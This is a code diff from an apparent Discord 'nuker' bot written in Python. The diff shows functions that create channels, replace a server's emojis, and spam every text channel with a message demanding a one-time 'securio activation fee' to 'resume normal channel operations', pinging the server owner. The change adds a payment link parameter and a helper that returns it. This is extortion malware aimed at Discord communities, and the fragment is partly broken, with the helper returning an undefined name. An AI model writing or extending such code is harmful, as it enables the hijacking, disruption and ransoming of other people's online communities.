@@ -44,7 +44,7 @@ async def create_channels(guild):
             await guild.create_voice_channel(name=voice_channel_name, category=cat)
 
 
-async def spam(guild):
+async def spam(guild, payment_link=None):
     for channel in guild.text_channels:
         if b_extort:
             await channel.send(f'Pay the 1 time securio activation fee to resume normal channel operations:\n{payment_link}\n{guild.owner.mention}')
@@ -130,3 +130,7 @@ async def replace_emojis(guild, d):
                 emoji.delete()
         for emoji, name in d['emojis']:
             await guild.create_custom_emoji(name=name, image=emoji)
+
+
+def payment():
+    return payment_link
